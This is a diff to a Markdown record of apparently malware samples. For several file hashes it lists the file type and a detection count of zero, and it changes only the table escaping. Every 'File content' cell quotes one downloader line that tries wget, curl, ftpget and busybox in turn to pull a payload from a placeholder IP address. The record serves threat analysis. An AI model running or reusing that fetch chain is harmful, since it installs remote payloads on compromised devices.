@@ -31,7 +31,7 @@
 |------| -------|
 | Hash | f704a4099553d77cd8a9fa8d181887cb6edbc8f7e86440743f975b5594cca97a  |
 |File type|  ASCII text, with no line terminators|
-|File content| S=ip address; (wget http://$S/p -O-||curl http://$S/p||ftpget $S - p||busybox wget http://$S/p -O-||busybox curl http://$S/p||busybox ftpget $S - p) |
+|File content| S=ip address; (wget http://$S/p -O-\|\|curl http://$S/p\|\|ftpget $S - p\|\|busybox wget http://$S/p -O-\|\|busybox curl http://$S/p\|\|busybox ftpget $S - p) |
 |Security vendors flagged this file as malicious| 0 / 60
 |Popular Threat Category| [] |
 |Popular Threat Name| [] |
@@ -44,7 +44,7 @@
 |------| -------|
 | Hash | 70ae01ad0654dd2111832a08525a0fdba6994cd26c1278d79a91d54c9cb113be  |
 |File type|  ASCII text, with no line terminators|
-|File content| S=ip address; (wget http://$S/p -O-||curl http://$S/p||ftpget $S - p||busybox wget http://$S/p -O-||busybox curl http://$S/p||busybox ftpget $S - p) |
+|File content| S=ip address; (wget http://$S/p -O-\|\|curl http://$S/p\|\|ftpget $S - p\|\|busybox wget http://$S/p -O-\|\|busybox curl http://$S/p\|\|busybox ftpget $S - p) |
 |Security vendors flagged this file as malicious| 0 / 50
 |Popular Threat Category| [] |
 |Popular Threat Name| [] |
@@ -57,7 +57,7 @@
 |------| -------|
 | Hash | 446c26d35cac3ecb54c860fd7c1ed3c51f1ca609b99c772f61a3615a1e31868b  |
 |File type|  ASCII text, with no line terminators|
-|File content| S=ip address; (wget http://$S/p -O-||curl http://$S/p||ftpget $S - p||busybox wget http://$S/p -O-||busybox curl http://$S/p||busybox ftpget $S - p) |
+|File content| S=ip address; (wget http://$S/p -O-\|\|curl http://$S/p\|\|ftpget $S - p\|\|busybox wget http://$S/p -O-\|\|busybox curl http://$S/p\|\|busybox ftpget $S - p)|
 |Security vendors flagged this file as malicious| 0 / 61
 |Popular Threat Category| [] |
 |Popular Threat Name| [] |
@@ -70,7 +70,7 @@
 |------| -------|
 | Hash | d9fde4e5cc24e7a961520adfe1484237007292f9e53676dfa1c84e4acfc06742  |
 |File type|  ASCII text, with no line terminators|
-|File content| S=ip address; (wget http://$S/p -O-||curl http://$S/p||ftpget $S - p||busybox wget http://$S/p -O-||busybox curl http://$S/p||busybox ftpget $S - p) |
+|File content| S=ip address; (wget http://$S/p -O-\|\|curl http://$S/p\|\|ftpget $S - p\|\|busybox wget http://$S/p -O-\|\|busybox curl http://$S/p\|\|busybox ftpget $S - p)|
 |Security vendors flagged this file as malicious| 0 / 61
 |Popular Threat Category| [] |
 |Popular Threat Name| [] |
@@ -83,7 +83,7 @@
 |------| -------|
 | Hash | c52248ffde4cb1f7a9f0c37120fb7ab237e9d66467341c2158c671b67fedebf7  |
 |File type|  ASCII text, with no line terminators|
-|File content| S=ip address; (wget http://$S/p -O-||curl http://$S/p||ftpget $S - p||busybox wget http://$S/p -O-||busybox curl http://$S/p||busybox ftpget $S - p) |
+|File content| S=ip address; (wget http://$S/p -O-\|\|curl http://$S/p\|\|ftpget $S - p\|\|busybox wget http://$S/p -O-\|\|busybox curl http://$S/p\|\|busybox ftpget $S - p) |
 |Security vendors flagged this file as malicious| 0 / 61
 |Popular Threat Category| [] |
 |Popular Threat Name| [] |
@@ -96,7 +96,7 @@
 |------| -------|
 | Hash | 3f23f40ef5ce2ba16b0f07441e6e4821db9f23f1f864afd39ed229e518bfecaa  |
 |File type|  ASCII text, with no line terminators|
-|File content| S=ip address; (wget http://$S/p -O-||curl http://$S/p||ftpget $S - p||busybox wget http://$S/p -O-||busybox curl http://$S/p||busybox ftpget $S - p) |
+|File content|S=ip address; (wget http://$S/p -O-\|\|curl http://$S/p\|\|ftpget $S - p\|\|busybox wget http://$S/p -O-\|\|busybox curl http://$S/p\|\|busybox ftpget $S - p) |
 |Security vendors flagged this file as malicious| 0 / 60
 |Popular Threat Category| [] |
 |Popular Threat Name| [] |
